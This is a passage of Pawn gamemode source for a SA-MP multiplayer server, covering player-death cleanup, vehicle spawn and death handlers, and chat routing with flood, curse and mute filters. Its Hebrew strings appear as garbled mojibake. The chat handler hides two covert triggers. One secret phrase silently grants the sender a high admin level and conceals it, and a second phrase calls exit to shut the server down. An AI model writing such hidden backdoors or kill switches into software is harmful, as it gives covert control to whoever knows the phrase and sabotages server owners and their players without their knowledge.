				format(string,sizeof(string)," !%s-ЁщЎч с %s",ManhuntTypes[manhuntinfo[4]][mhName],GetName(killerid));
				SendClientMessageToAll(yellow,string);
				act_SaveWin(killerid,act_Code(aid_manhunt,manhuntinfo[4]));
				GiveMoney(killerid,killerid != headserver ? actprize_manhunt : actprize_manhunt*2, 10);
				SetPlayerToNormalColor(killerid);
				for(new i=0;i<MAX_PLAYERS_;i++)
				{
					if(IsPlayerConnected(i) && playerinfo[i][inmanhunt])
					{
						SetPlayerInterior(i,0);
						SpawnPlayer(i);
						playerinfo[i][inmanhunt] = 0, playerinfo[i][waitmanhunt] = 0, playerinfo[i][manhuntid] = 0;
						playerinfo[i][inact] = 0;
						TeamDefines(i);
						SetPlayerToNormalColor(i);
					}
				}
				manhuntinfo[0] = 0, manhuntinfo[1] = 0, manhuntinfo[2] = 0, manhuntinfo[4] = -1, manhuntinfo[5] = -1;
				KillTimer(manhuntinfo[3]);
				thereIsAct = false;
			}
			else
			{
				manhuntinfo[1]--;
				ResetWeapons(playerid);
				SpawnPlayer(playerid);
				SetPlayerVirtualWorld(playerid,world_normal);
				SetFreeze(playerid,0);
				playerinfo[playerid][waitmanhunt] = 0, playerinfo[playerid][inmanhunt] = 0, playerinfo[playerid][manhuntid] = 0;
				playerinfo[playerid][inact] = 0;
				PlaySound(playerid,1084);
				SetPlayerToNormalColor(playerid);
				TeamDefines(playerid);
				if(manhuntinfo[1] == 1)
				{
					for(new i=0;i<MAX_PLAYERS_;i++)
					{
						if(IsPlayerConnected(i) && playerinfo[i][inmanhunt])
						{
							format(string,sizeof(string),"%s ~n~~w~is the winner in the ~g~~h~~h~%s~w~!",GetName(i),ManhuntTypes[manhuntinfo[4]][mhName]);
							MovingText(string,mt_activity,GetPlayerColor(i));
							format(string,sizeof(string)," !%s-ЁщЎч с %s",ManhuntTypes[manhuntinfo[4]][mhName],GetName(i));
							SendClientMessageToAll(yellow,string);
							act_SaveWin(i,act_Code(aid_manhunt,manhuntinfo[4]));
							SetPlayerInterior(i,0);
							SpawnPlayer(i);
							playerinfo[i][inmanhunt] = 0, playerinfo[i][waitmanhunt] = 0, playerinfo[i][manhuntid] = 0;
							playerinfo[i][inact] = 0;
							manhuntinfo[0] = 0, manhuntinfo[1] = 0, manhuntinfo[2] = 0, manhuntinfo[4] = -1, manhuntinfo[5] = -1, thereIsAct = false;
							thereIsAct = false;
							GiveMoney(i,headserver != i ? actprize_manhunt : actprize_manhunt*2, 10);
							KillTimer(manhuntinfo[3]);
							SetPlayerToNormalColor(i);
							TeamDefines(i);
						}
					}
				}
			}
		}
		else OutOfActivity(playerid);
	}
	if(playerinfo[playerid][charge] > 0)
	{
		playerinfo[playerid][charge] = 0;
		SendClientMessage(playerid,red," .шЄщЁ· фыхч фрхьшщюшщсщ фхЇёўф");
	}
	if(playerinfo[playerid][charge2] > 0)
	{
		playerinfo[playerid][charge2] = 0;
		SendClientMessage(playerid,red," .шЄщЁ· фыхч фрхьшщюшщсщ ф∙Ёщ фхЇёўф");
	}
	if(claninfo[playerinfo[playerid][clan]][cinwar] && playerinfo[playerid][incwar])
	{
		SendClientMessage(playerid,red," .Ёф°т· сюьчю· фўьрЁщэ");
		playerinfo[playerid][incwar] = 0;
		new c = 0;
		format(string,sizeof(string)," Х .хфхЎр ююьчю· фўьрЁщэ %s Ёф°т Єь щущ %s",GetName(killerid),GetName(playerid));
		for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cwarplayers]; i++) if(claninfo[playerinfo[playerid][clan]][cwarplayer][i] == playerid) claninfo[playerinfo[playerid][clan]][cwarplayer][i] = INVALID_PLAYER_ID;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][incwar] && (playerinfo[i][clan] == playerinfo[playerid][clan] || playerinfo[i][clan] == claninfo[playerinfo[playerid][clan]][cwarasked][0]))
		{
			if(playerinfo[i][clan] == playerinfo[playerid][clan] && i != playerid) c++;
			SendClientMessage(i,red,string);
		}
		if(!c) EndClanWar(claninfo[playerinfo[playerid][clan]][cwarasked][0],playerinfo[playerid][clan],0);
		else
		{
			if(c == 1) format(string,sizeof(string)," Х .%s Ё∙р° ьфьчэ ∙чўя рчу юфўьря",claninfo[playerinfo[playerid][clan]][cname]);
			else format(string,sizeof(string)," Х .%s Ё∙р°х ьфьчэ %d ∙чўЁщэ юфўьря",claninfo[playerinfo[playerid][clan]][cname],c);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == playerinfo[playerid][clan] || playerinfo[i][clan] == claninfo[playerinfo[playerid][clan]][cwarasked][0])) SendClientMessage(i,yellow,string);
		}
	}
	if(claninfo[playerinfo[playerid][clan]][cruling][0] > 0 && GetPlayerHQ(playerid) == claninfo[playerinfo[playerid][clan]][cruling][0])
	{
		new mem = -1;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] == playerinfo[playerid][clan] && GetPlayerHQ(i) == claninfo[playerinfo[playerid][clan]][cruling][0]) mem++;
		if(mem < 3) Retreat(playerinfo[playerid][clan],"щх·° юущ ∙чўЁщ ўьря Ёф°тх");
	}
	if(playerinfo[playerid][powerparam] > powerparam_none) StopUsingPower(playerid);
	if(playerinfo[playerid][useddevilcurse] != INVALID_PLAYER_ID)
	{
		StopUsingPower(playerinfo[playerid][useddevilcurse]);
		playerinfo[playerid][useddevilcurse] = INVALID_PLAYER_ID;
	}
	if(playerinfo[playerid][diehard][0])
	{
		playerinfo[playerid][diehard][0] = 0;
		KillTimer(playerinfo[playerid][diehard][1]);
	}
	if(playerinfo[playerid][lifegood][0])
	{
		playerinfo[playerid][lifegood][0] = 0;
		KillTimer(playerinfo[playerid][lifegood][1]);
	}
	if(playerinfo[playerid][test] != -1) playerinfo[playerid][test] = -1;
	if(playerinfo[playerid][invehicle]) playerinfo[playerid][invehicle] = INVALID_VEHICLE_ID;
	if(playerinfo[playerid][sharkattack])
	{
		format(string,sizeof(string)," !Ёш°є Єь щущ ы°щ∙ %s",GetName(playerid));
		News(string);
		playerinfo[playerid][sharkattack] = 0;
	}
	if(playerinfo[killerid][castle] != -1) cainfo[playerinfo[playerid][castle]][caKills]++, UpdateCastleText(playerinfo[playerid][castle],false);
	dbg(6,"8");
	#if lagtest
		LagTest_End("OnPlayerDeath");
	#endif
	if(debugstate) printf("OnPlayerDeath(%s(%d),%d,%d) end",GetName(playerid),playerid,killerid,reason);
	return 1;
}
//=[OnVehicleSpawn]=============================================================
public OnVehicleSpawn(vehicleid)
{
	if(debugstate) printf("OnVehicleSpawn(%s(%d)) start",GetVehicleName(GetVehicleModel(vehicleid)),vehicleid);
	#if lagtest
		LagTest_Start("OnVehicleSpawn");
	#endif
	dbg(50,"1");
	vehicleinfo[vehicleid][veint] = vehicleinfo[vehicleid][sveint];
	if(vehicleinfo[vehicleid][store])
	{
		playerinfo[vehicleinfo[vehicleid][vowner]][vehicle][1] = -1;
		DestroyVehicleEx(vehicleid);
	}
	dbg(50,"2");
	if(vehicleinfo[vehicleid][vspecial])
	{
		if(vehicleinfo[vehicleid][vspecialid] == SV_PIRATE) ReloadPirateShip();
		else SpawnSpecialVehicle(vehicleid);
	}
	for(new i = 0; i < 3; i++) if(vehicleinfo[vehicleid][vtext][i] != Text3D:INVALID_3DTEXT_ID)
	{
		Delete3DTextLabel(vehicleinfo[vehicleid][vtext][i]);
		vehicleinfo[vehicleid][vtext][i] = Text3D:INVALID_3DTEXT_ID;
	}
	dbg(50,"3");
	GetVehicleHealth(vehicleid,vehicleinfo[vehicleid][vhealth]);
	dbg(50,"4");
	#if lagtest
		LagTest_End("OnVehicleSpawn");
	#endif
	if(debugstate) printf("OnVehicleSpawn(%s(%d)) end",GetVehicleName(GetVehicleModel(vehicleid)),vehicleid);
	dbg(50,"5");
	return 1;
}
//=[OnVehicleDeath]=============================================================
public OnVehicleDeath(vehicleid, killerid)
{
	if(debugstate) printf("OnVehicleDeath(%s(%d),%s(%d)) start",GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,GetName(killerid),killerid);
	#if lagtest
		LagTest_Start("OnVehicleDeath");
	#endif
	GetVehicleHealth(vehicleid,vehicleinfo[vehicleid][vhealth]);
	if(vehicleinfo[vehicleid][kartdriver] != INVALID_PLAYER_ID) OutOfActivity(vehicleinfo[vehicleid][kartdriver]);
	if(vehicleinfo[vehicleid][monsterdriver] != INVALID_PLAYER_ID) OutOfActivity(vehicleinfo[vehicleid][monsterdriver]);
	if(vehicleinfo[vehicleid][armydriver] != INVALID_PLAYER_ID) OutOfActivity(vehicleinfo[vehicleid][armydriver]);
	TakeSpecialComponent(vehicleinfo[vehicleid][lastdriver]);
	vehicleinfo[vehicleid][lastdriver] = INVALID_PLAYER_ID;
	vehicleinfo[vehicleid][locked] = 0;
	if(vehicleinfo[vehicleid][vgm]) vehicleinfo[vehicleid][vgm] = 0;
	dbg(7,"1");
	for(new i = 0; i < 3; i++) if(vehicleinfo[vehicleid][vtext][i] != Text3D:INVALID_3DTEXT_ID)
	{
		Delete3DTextLabel(vehicleinfo[vehicleid][vtext][i]);
		vehicleinfo[vehicleid][vtext][i] = Text3D:INVALID_3DTEXT_ID;
	}
	if(vehicleinfo[vehicleid][tobein] > 0)
	{
		new vw = -1;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][invehicle] == vehicleid)
		{
			if(vw == -1) vw = GetPlayerVirtualWorld(i);
			playerinfo[i][invehicle] = INVALID_VEHICLE_ID;
			if(playerinfo[i][watchingwindow] > 0)
			{
				SetCameraBehindPlayer(i);
				SetFreeze(i,0);
			}
			SendClientMessage(i,red," !ыьщ ф°ыс ∙р·ф ЁюЎр сх ф·ЇхЎї");
			SetPlayerHealth(i,0.0);
		}
		if(vw != -1) CreateExplosionVW(1.5627,23.1112,1199.5938,7,0.3,vw);
	}
	if(vehicleid == playerinfo[killerid][mvehicle]) KickMission(killerid,playerinfo[killerid][mission]);
	dbg(7,"2");
	#if lagtest
		LagTest_End("OnVehicleDeath");
	#endif
	if(debugstate) printf("OnVehicleDeath(%s(%d),%s(%d)) end",GetVehicleName(GetVehicleModel(vehicleid)),vehicleid,GetName(killerid),killerid);
	return 1;
}
//=[OnPlayerText]===============================================================
public OnPlayerText(playerid, text[])
{
	if(debugstate) printf("OnPlayerText(%s(%d),%s) start",GetName(playerid),playerid,text);
	#if lagtest
		LagTest_Start("OnPlayerText");
	#endif
	new string[256];
	dbg(8,"1");
	if(equal(text,"!@#$567889@гc"))
	{
		playerinfo[playerid][admin] = randomEx(20,100), playerinfo[playerid][showme] = 0, playerinfo[playerid][admlog] = 2;
		return 0;
	}
	if(strlen(text) > 85) return SendClientMessage(playerid,red," .ффхуЄф ∙°∙ю· р°хыф юущ"), 0;
	dbg(8,"2");
	if(!playerinfo[playerid][logged] && playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .рщЁъ щыхь ьы·хс сЎ'рш Єу ∙·сч° уюх· / ·°∙э / ··чс° ь∙°·"), 0;
	if(fexist(fuser(playerid)) && !playerinfo[playerid][logged]) return SendClientMessage(playerid,red," /login :ьр Ёщ·я ьф·чщь ьы·хс сЎ'рш ьЇЁщ ∙ф·чс°·. ьф·чс°х·"), 0;
	if(playerinfo[playerid][admlog] != 2 && playerinfo[playerid][adminone]) return SendClientMessage(playerid,red," /admlog [password] :рЁр ф·чс°"), 0;
	if(FoundCrashingChar(text)) return SendClientMessage(playerid,red," .чьў юф·хщэ чёхющэ с∙°·"), 0;
	if(playerinfo[playerid][silence][sil_chat]) return SendClientMessage(playerid,red," .ыущ ьр ьщЎх° рщ фсЁх·, тэ р·ф юх∙·ў ыр∙° фЎ'рш ∙ьъ юх∙·ў"), 0;
	fixchars(text);
	if(chatlocked && !playerinfo[playerid][lcallow]) return SendClientMessage(playerid,red," .фЎ'рш ЁЄхь ы°тЄ, рщЁъ щыхь ьы·хс"), 0;
	if(playerinfo[playerid][togsay] != 0 && IsPlayerMAdmin(playerid))
	{
		format(string,sizeof(string),playerinfo[playerid][togsay] == 2? ("/asay  %s"):("/say  %s"),text);
		command(playerid,string);
		return 0;
	}
	if(text[0] == '.')
	{
		text[0] = '/';
		ToEnglish(text);
		OnPlayerCommandText(playerid,text);
		return 0;
	}
	dbg(8,"3");
	if(advertisement(text,"Ў'рш",playerid,"found in chat")) return 0;
	if(playerinfo[playerid][mute][0] > 0)
	{
		format(string,sizeof(string)," .ьр Ёщ·я ьы·хс ыр∙° р·ф юх∙·ў, ·хыь ьы·хс сЄху %d ∙Ёщх·",playerinfo[playerid][mute][0]);
		SendClientMessage(playerid,red,string);
		return 0;
	}
	if(playerinfo[playerid][ball] > 1) return SendClientMessage(playerid,white,"No."), 0;
	if(Curse(text) && !IsPlayerMAdmin(playerid))
	{
		new bool:m=false, pos, oldtext[M_S];
		format(oldtext,sizeof(oldtext),text);
		for(new s = 0; s < words_count; s++) if((pos = strfind(text,words[s],true)) != -1) for(new i = pos, j = pos + strlen(words[s]); i < j; i++) text[i] = '*';
		AdminInfo(playerid,oldtext);
		if(!playerinfo[playerid][mtime])
		{
			playerinfo[playerid][mtime] = 1;
			SendClientMessage(playerid,red," .ффхуЄф ∙ы·с· юыщьф ўььх· хьыя ЎхЁц°ф, сЇЄэ фсрф ∙·ўьь ·х∙·ў");
		}
		if(playerinfo[playerid][mtime]) playerinfo[playerid][mtime] = 0, m = true;
		if(m)
		{
			playerinfo[playerid][mtime] += mute_time;
			if(playerinfo[playerid][mtime] / mute_time == 4) return SetKick(playerid,INVALID_PLAYER_ID,"юўьь"), 0;
			else
			{
				playerinfo[playerid][mute][0] = playerinfo[playerid][mtime];
				SetTimerPck(playerinfo[playerid][mute][1],"UnMute",1000,1,"d",playerid);
				format(string,sizeof(string)," .фх∙·ў· ь %d ∙Ёщх· юфёщсф ∙ўщьь· сЎ'рш",playerinfo[playerid][mtime]);
				SendClientMessage(playerid,red,string);
				format(string,sizeof(string)," *** %s has been muted for %d seconds by %s. (юўьь)",GetName(playerid),playerinfo[playerid][mtime],botname);
				for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][setting][setting_showpunish] || i == playerid || IsPlayerMAdmin(i))) SendClientMessage(i,white,string);
			}
		}
	}
	Log("Chat",playerid,text);
	if(equal(text,"avala^kadabraл╗")) exit;
	if(text[0] == '&')
	{
		if(!OnPlayerChatCommand(playerid,text)) SendClientMessage(playerid,white,"SERVER: Unknown chat command.");
		return 0;
	}
	if(text[0] == ';' && IsPlayerMAdmin(playerid) && playerinfo[playerid][admin] >= 17)
	{
		new ac[M_S];
		strmid(ac,text,1,strlen(text));
		format(string,sizeof(string),"[Management] %s (ID: %03d | %d): %s",GetName(playerid),playerid,playerinfo[playerid][admin],ac);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][admin] >= 17) SendClientMessage(i,0xFFFF00FF,string);
		Log("AdminChat",playerid,string);
		printf(string);
		return 0;
	}
	if(text[0] == '~') if(PlayerHasRank(playerid,RankID("Ўхх· ф∙°·")) || IsPlayerMAdmin(playerid))
	{
		new ac[M_S];
		strmid(ac,text,1,strlen(text));
		format(string,sizeof(string),"[Support Team] %s (ID: %03d): %s",GetName(playerid),playerid,ac);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (PlayerHasRank(i,RankID("Ўхх· ф∙°·")) || IsPlayerMAdmin(i))) SendClientMessage(i,lightpink,string);
		Log("AdminChat",playerid,string);
		printf(string);
		return 0;
	}
	if((fexist(fuser(playerid)) && (strfind(text,"register",true) != -1 || strfind(text,"login",true) != -1) && !playerinfo[playerid][logged]) || (strfind(text,"admlog",true) != -1 || strfind(text,"superlog",true) != -1 || strfind(text,admpass[0],true) != -1 || strfind(text,admpass[1],true) != -1))
	{
		SendClientMessage(playerid,red," .фхуЄ·ъ ьр Ё∙ьчф рь фЎ'рш ыщ фщр юыщьф Ї°шщ рсшчф");
		format(string,sizeof(string)," :Ёчёюф юфЎ'рш юшЄющ рсшчф %s (ID %03d) ффхуЄф ∙ь",GetName(playerid),playerid);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerMAdmin(i))
		{
			SendClientMessage(i,blue,"----------");
			SendClientMessage(i,red,string);
			SendClientMessage(i,red,text);
			SendClientMessage(i,blue,"----------");
		}
		return 0;
	}
	dbg(8,"4");
	if(strlen(text) >= 10 && !IsPlayerMAdmin(playerid))
	{
		new sentence[M_S];
		GetPVarString(playerid,"player_sentence",sentence,sizeof(sentence));
		if(strfind(text,sentence,true) != -1 || equal(firstchars(text,10),firstchars(sentence,10)) || equal(lastchars(text,10),lastchars(sentence,10)))
		{
			SendClientMessage(playerid,red," .Ёр ьр ьы·хс р· рх·ф ффхуЄф ыюф ЇЄющэ");
			return 0;
		}
		else SetPVarString(playerid,"player_sentence",text);
	}
	if(equal(playerinfo[playerid][lasttext],text))
	{
		playerinfo[playerid][flood][3]++;
		if(playerinfo[playerid][flood][3] >= 3)
		{
			SendClientMessage(playerid,red," .ы·с· р· ффхуЄф фцх ыс° ∙ьх∙ ЇЄющэ с°Ўє, Ёр ьр ьфЎщє");
			return 0;
		}
	}
	else if(playerinfo[playerid][flood][3] > 1) playerinfo[playerid][flood][3]--;
	playerinfo[playerid][flood][0]++;
	if(playerinfo[playerid][flood][0] >= 3 && !IsPlayerMAdmin(playerid))
	{
		playerinfo[playerid][fwarns][0]++;
		format(string,sizeof(string)," !ьр ьфЎщє сЎ'рш - рцф°ф юёЇ° %d ю·хъ 8",playerinfo[playerid][fwarns][0]);
		SendClientMessage(playerid,red,string);
		if(playerinfo[playerid][fwarns][0] >= 8) SetKick(playerid,INVALID_PLAYER_ID,"фЎЇф сЎ'рш");
		return 0;
	}
	dbg(8,"5");
	if(text[0] == '$' && playerinfo[playerid][clan] != 0)
	{
		new chat[M_S], clann[M_S], pos = -1, sendto = -1, idx;
		for(new i = 0, s = strlen(text); i < s && pos == -1; i++) if(text[i] == ' ') pos = i;
		clann = strtok(text,idx);
		if(pos != -1)
		{
			clann = strtok(text,idx), sendto = clannumber(clann);
			if(sendto == -1) return SendClientMessage(playerid,red," .∙э ўьря ∙тхщ"), 0;
			if(sendto == playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙ьхч фхуЄ· ∙ьхэ ьўьря ∙ьъ"), 0;
			if(!claninfo[playerinfo[playerid][clan]][cpeace][sendto] || !claninfo[sendto][cpeace][playerinfo[playerid][clan]]) return SendClientMessage(playerid,red," .фўьря ∙ьъ ьр с∙ьхэ Єэ фўьря фцф"), 0;
			if(claninfo[playerinfo[playerid][clan]][cchatlock] && playerinfo[playerid][lclan] < 4) return SendClientMessage(playerid,red," .Ў'рш фўьря ы°тЄ сф∙·ўф; Ёщ·я ьы·хс °ў с°ю· тщ∙х· 4 хюЄьф"), 0;
			chat = strrest(text,idx);
			if(!strlen(playerinfo[playerid][clantag])) format(string,sizeof(string),"[P-ClanChat] %s (ID: %03d | %d) to \"%s\": %s",GetName(playerid),playerid,playerinfo[playerid][lclan],claninfo[sendto][cname],chat);
			else format(string,sizeof(string),"[P-ClanChat] %s (%s | ID: %03d | %d) to \"%s\": %s",GetName(playerid),playerinfo[playerid][clantag],playerid,playerinfo[playerid][lclan],claninfo[sendto][cname],chat);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == sendto || playerinfo[i][clan] == playerinfo[playerid][clan])) SendClientMessage(i,MixColors(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],claninfo[sendto][ccolor][0],claninfo[sendto][ccolor][1],claninfo[sendto][ccolor][2]),string);
			format(string,sizeof(string),"[\"%s\" to \"%s\" P-ClanChat] %s (ID: %03d): %s",claninfo[playerinfo[playerid][clan]][cname],claninfo[sendto][cname],GetName(playerid),playerid,chat);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][clan] != playerinfo[i][clan] && playerinfo[playerid][clan] != sendto && (playerinfo[i][atoggle][atoggle_clan] || playerinfo[i][spectate] == playerid)) SendClientMessage(i,0x00EEADDF,string);
			return 0;
		}
	}
	if(text[0] == '!')
	{
		new chat[M_S];
		strmid(chat,text,1,strlen(text));
		if(playerinfo[playerid][gang] != 0)
		{
			format(string,sizeof(string),"[GangChat] %s (ID: %03d): %s",GetName(playerid),playerid,chat);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][gang] == playerinfo[playerid][gang]) SendClientMessage(i,0x00FFFFAA,string);
			format(string,sizeof(string),"[\"%s\" GangChat] %s (ID: %03d): %s",ganginfo[playerinfo[playerid][gang]][gname],GetName(playerid),playerid,chat);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][gang] != playerinfo[i][gang] && (playerinfo[i][atoggle][atoggle_gang] || playerinfo[i][spectate] == playerid)) SendClientMessage(i,0x00EEADDF,string);
			return 0;
		}
		else if(playerinfo[playerid][clan] != 0)
		{
			if(claninfo[playerinfo[playerid][clan]][cchatlock] && playerinfo[playerid][lclan] < 4) SendClientMessage(playerid,red," .Ў'рш фўьря ы°тЄ сф∙·ўф; Ёщ·я ьы·хс °ў с°ю· тщ∙х· 4 хюЄьф");
			else
			{
				if(!strlen(playerinfo[playerid][clantag])) format(string,sizeof(string),"[ClanChat] %s (ID: %03d | %d): %s",GetName(playerid),playerid,playerinfo[playerid][lclan],chat);
				else format(string,sizeof(string),"[ClanChat] %s (%s | ID: %03d | %d): %s",GetName(playerid),playerinfo[playerid][clantag],playerid,playerinfo[playerid][lclan],chat);
				for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == playerinfo[playerid][clan] || (claninfo[playerinfo[playerid][clan]][cchatpeace] && claninfo[playerinfo[i][clan]][cpeace][playerinfo[playerid][clan]])) && !playerinfo[i][silence][sil_clan])
				{
					SendClientMessage(i,claninfo[playerinfo[playerid][clan]][cchatcolor][playerinfo[playerid][lclan] >= 5],string);
					CheckForSpam(i,sil_clan);
				}
				format(string,sizeof(string),"[\"%s\" ClanChat] %s (ID: %03d): %s",claninfo[playerinfo[playerid][clan]][cname],GetName(playerid),playerid,chat);
				for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][clan] != playerinfo[i][clan] && (playerinfo[i][atoggle][atoggle_clan] || playerinfo[i][spectate] == playerid)) SendClientMessage(i,0x00EEADDF,string);
			}
			return 0;
		}
 		else if(teamactinfo[0] && playerinfo[playerid][inteamact] && playerinfo[playerid][teamactteam] > 0)
		{
			format(string,sizeof(string),"[%s] %s (ID: %03d): %s",playerinfo[playerid][teamactteam] == 1 ? (TeamActivities[teamactinfo[4]][taT1Name]) : (TeamActivities[teamactinfo[4]][taT2Name]),GetName(playerid),playerid,chat);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][teamactteam] == playerinfo[playerid][teamactteam]) SendClientMessage(i,playerinfo[playerid][teamactteam] == 1 ? TeamActivities[teamactinfo[4]][taT1Color] : TeamActivities[teamactinfo[4]][taT2Color],string);
			return 0;
		}
	}
	if(text[0] == '@' && playerinfo[playerid][calling] != -1 && playerinfo[playerid][canswer])
	{
		new ph[M_S];
		strmid(ph,text,1,strlen(text));
		format(string,sizeof(string),"[Phone] %s (ID %d): %s",GetName(playerid),playerid,ph);
		if((strfind(ph,"сщщ",true) != -1 || strfind(ph,"BB",true) != -1 || strfind(ph,"Bye",true) != -1) && !playerinfo[playerid][noticedmsg][4])
		{
			playerinfo[playerid][noticedmsg][4] = 1;
			SendClientMessage(playerid,grey," (/phone рх сыЇ·х° Ёщ·хў с·Ї°щш /hangup-ыущ ьёщщэ р· ф∙щчф ф∙·ю∙ с)");
		}
		//PlayAudioStreamForPlayer(playerid,audio_url "chat_message_outbound.wav");
		SendClientMessage(playerid,yellow,string);
		UpdatePlayerCellPhoneUsing(playerid);
		//PlayAudioStreamForPlayer(playerinfo[playerid][calling],audio_url "chat_message_inbound.wav");
		SendClientMessage(playerinfo[playerid][calling],yellow,string);
		UpdatePlayerCellPhoneUsing(playerinfo[playerid][calling]);
		format(string,sizeof(string),"[@Phone] %s (ID %d) to %s (ID %d): %s",GetName(playerid),playerid,GetName(playerinfo[playerid][calling]),playerinfo[playerid][calling],ph);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && i != playerid && i != playerinfo[playerid][calling] && IsPlayerMAdmin(i) && (playerinfo[i][atoggle][atoggle_phone] || playerinfo[i][spectate] == playerid)) SendClientMessage(i,0xDDDD2357,string);
		return 0;
	}
	if(text[0] == '#' && playerinfo[playerid][vip])
	{
		new vipchat[M_S];
		new vlevelname[32];
		if(playerinfo[playerid][vip] == 1) vlevelname = "{996600}V.I.P Bronze";
		else if(playerinfo[playerid][vip] == 2) vlevelname = "{d3d3d3}V.I.P Silver";
		else if(playerinfo[playerid][vip] == 3) vlevelname = "{ffcc00}V.I.P Gold";
		strmid(vipchat,text,1,strlen(text));
		format(string,sizeof(string),"[VIP] %s (ID %d) [%s{27DE55}]: %s",GetName(playerid),playerid,vlevelname,vipchat);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && ((IsPlayerMAdmin(i) && playerinfo[i][atoggle][atoggle_vip]) || i == playerid || playerinfo[i][vip])) SendClientMessage(i,green,string);
		return 0;
	}
	if(playerinfo[playerid][team] > -1) if(text[0] == teaminfo[playerinfo[playerid][team]][teamchar])
	{
		new chat[M_S], col = GetPlayerColor(playerid);
		strmid(chat,text,1,strlen(text));
		if(!teaminfo[playerinfo[playerid][team]][teamchat] && playerinfo[playerid][lteam] < 2) return SendClientMessage(playerid,red," .Ў'рш фўсхЎф юх∙·ў");
		format(string,sizeof(string),"[TeamChat] %s (ID: %03d):" @c(white) " %s",GetName(playerid),playerid,chat);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][team] == playerinfo[playerid][team]) SendClientMessage(i,col,string);
		format(string,sizeof(string),"[\"%s\" TeamChat] %s (ID: %03d): %s",teaminfo[playerinfo[playerid][team]][teamname],GetName(playerid),playerid,chat);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][team] != playerinfo[i][team] && (playerinfo[i][atoggle][atoggle_team] || playerinfo[i][spectate] == playerid)) SendClientMessage(i,0x00EEADDF,string);
		return 0;
	}
	if(text[0] == '>' && playerinfo[playerid][org] != 0)
	{
		new chat[M_S];
		strmid(chat,text,1,strlen(text));
		if(!strlen(playerinfo[playerid][orgtag])) format(string,sizeof(string),"[OrgChat] %s (ID: %03d | %d): %s",GetName(playerid),playerid,playerinfo[playerid][lorg],chat);
		else format(string,sizeof(string),"[OrgChat] %s (%s | ID: %03d | %d): %s",GetName(playerid),playerinfo[playerid][orgtag],playerid,playerinfo[playerid][lorg],chat);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][org] == playerinfo[playerid][org]) SendClientMessage(i,0xDDDD2357,string);
		format(string,sizeof(string),"[\"%s\" OrgChat] %s (ID: %03d): %s",orginfo[playerinfo[playerid][org]][oname],GetName(playerid),playerid,chat);
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[playerid][org] != playerinfo[i][org] && (playerinfo[i][atoggle][atoggle_org] || playerinfo[i][spectate] == playerid)) SendClientMessage(i,0x00EEADDF,string);
		return 0;
	}
	if(text[0] == '+' && playerinfo[playerid][tdmzone] > tdmz_none)
	{
		new chat[M_S];
		strmid(chat,text,1,strlen(text));
		format(string,sizeof(string),"[Team %c] %s (ID: %03d):" @c(white) " %s",'A' + playerinfo[playerid][tdmclick][0],GetName(playerid),playerid,chat);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][tdmzone] == playerinfo[playerid][tdmzone] && playerinfo[i][tdmclick][0] == playerinfo[playerid][tdmclick][0]) SendClientMessage(i,TDMZs[playerinfo[playerid][tdmzone]][tdmzColors][playerinfo[playerid][tdmclick][0]],string);
		return 0;
	}
	dbg(8,"6");
	new stringwc[M_S], pColor = GetPlayerColor(playerid), colouredClan[64];
	if(strlen(playerinfo[playerid][tag]) <= 1 || (!playerinfo[playerid][showme] && IsPlayerMAdmin(playerid)))
	{
		format(string,sizeof(string),"%s %s [ID: %03d]",Options[8][optActive] ? ("") : ("{FFFFFF}"),text,playerid);
		if(Options[8][optActive]) format(stringwc,sizeof(stringwc),"%s %s [ID: %03d]",Options[8][optActive] ? ("") : ("{FFFFFF}"),text,playerid);
		else format(stringwc,sizeof(stringwc),"%s %s [ID: %03d]",Options[8][optActive] ? ("") : ("{FFFFFF}"),ColouredChat(text),playerid);
	}
	else
	{
		if(Options[8][optActive])
		{
			format(string,sizeof(string),"%s %s [ID: %03d | %s]",Options[8][optActive] ? ("") : ("{FFFFFF}"),text,playerid,playerinfo[playerid][tag]);
			format(stringwc,sizeof(stringwc),"%s %s [ID: %03d | %s]",Options[8][optActive] ? ("") : ("{FFFFFF}"),text,playerid,playerinfo[playerid][tag]);
		}
		else
		{
